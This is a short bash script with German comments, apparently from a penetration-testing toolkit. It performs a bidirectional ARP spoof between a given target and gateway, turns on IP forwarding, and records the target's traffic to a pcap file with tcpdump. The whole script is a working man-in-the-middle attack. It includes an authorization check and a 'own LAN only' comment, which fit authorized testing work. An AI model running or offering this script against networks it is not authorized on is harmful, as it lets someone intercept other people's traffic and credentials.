#!/usr/bin/env bash
# arp-spoof.sh - bidirektionaler ARP-Spoof zwischen Target und Gateway
# Nur im eigenen LAN. Logged Traffic per tcpdump.
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
TARGET="${2:-}"
GATEWAY="${3:-}"
[[ -z "$IFACE" || -z "$TARGET" || -z "$GATEWAY" ]] && {
    echo "Usage: $0 <iface> <target-ip> <gateway-ip>"
    exit 1
}
require_auth "$TARGET"
require_auth "$GATEWAY"

require_bin arpspoof
require_bin tcpdump

outdir="$(make_outdir captures arpspoof-${TARGET//./_})"

log_info "IP-Forwarding einschalten"
sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null

cleanup() {
    log_info "Cleanup"
    sudo kill $A1 $A2 $DUMP 2>/dev/null || true
    sudo sysctl -w net.ipv4.ip_forward=0 >/dev/null
}
trap cleanup EXIT INT TERM

log_info "Starte arpspoof Target->Gateway"
sudo arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
A1=$!
log_info "Starte arpspoof Gateway->Target"
sudo arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
A2=$!

log_info "tcpdump auf $IFACE -> $outdir/capture.pcap"
sudo tcpdump -i "$IFACE" -w "$outdir/capture.pcap" "host $TARGET" &
DUMP=$!

log_warn "Laeuft. Strg+C zum Beenden."
wait
